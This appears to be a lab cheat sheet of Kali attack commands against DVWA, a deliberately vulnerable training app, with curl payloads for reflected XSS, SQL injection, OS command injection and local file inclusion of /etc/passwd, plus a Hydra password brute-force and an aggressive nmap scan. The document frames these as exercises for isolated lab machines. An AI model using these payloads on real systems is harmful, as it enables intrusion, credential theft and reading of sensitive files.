# 🛠️ Kali Attack Scripts for DVWA Targets

---

## 1. Cross-Site Scripting (XSS)

### Script:

```bash
curl "http://<Ubuntu-IP>/DVWA/vulnerabilities/xss_r/?name=<script>alert('xss')</script>" \
  -b "PHPSESSID=your_session_id; security=low"

curl "http://<Ubuntu-IP>/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert('xss')%3C/script%3E" \
  -b "PHPSESSID=your_session_id; security=low"
```

> Triggers a reflected XSS vulnerability.

---

## 2. SQL Injection (SQLi)

### Script:

```bash
curl "http://<Ubuntu-IP>/dvwa/vulnerabilities/sqli/?id=1%27%20OR%201%3D1--&Submit=Submit" \
  -b "PHPSESSID=your_session_id; security=low"
```

> Exploits SQL injection to bypass authentication logic.

---

## 3. Command Injection

### Script:

```bash
curl "http://<Ubuntu-IP>/DVWA/vulnerabilities/exec/?ip=127.0.0.1;ls&Submit=Submit" \
  -b "PHPSESSID=your_session_id; security=low"

curl "http://<Ubuntu-IP>/DVWA/vulnerabilities/exec/?ip=127.0.0.1&&whoami&Submit=Submit" \
  -b "PHPSESSID=your_session_id; security=low"
```

> Executes OS-level commands via input injection.

---

## 4. Brute Force Login (Hydra)

### Script:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <Ubuntu-IP> \
http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V -t 10 -w 30
```

> Performs a brute-force login attack using Hydra with a known wordlist.

---

## 5. File Inclusion (LFI)

### Script:

```bash
curl "http://<Ubuntu-IP>/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd" \
  -H "Cookie: PHPSESSID=your_session_id; security=low"
```

> Exploits Local File Inclusion to read sensitive files.

---

## 6. Reconnaissance (Nmap)

### Script:

```bash
nmap -A <Ubuntu-IP>
```

> Performs aggressive scanning and OS detection against the target.

---

✅ Make sure DVWA security level is set to **Low** while testing.

🔒 Use these scripts only in legal, isolated lab environments (e.g., your own VMs).
